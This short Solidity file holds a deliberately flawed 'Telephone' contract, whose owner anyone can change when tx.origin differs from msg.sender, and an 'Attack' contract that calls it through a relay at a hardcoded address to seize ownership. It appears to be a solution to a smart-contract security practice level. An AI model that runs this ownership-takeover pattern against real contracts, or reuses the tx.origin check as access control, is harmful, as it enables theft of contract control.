// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attack {
    Telephone public telephone = Telephone(payable(0xCa4F7Bc639C365ce930ceD1b4C9d6fC39461A796));
    
    function exploit() public {
        telephone.changeOwner(msg.sender);
    }
}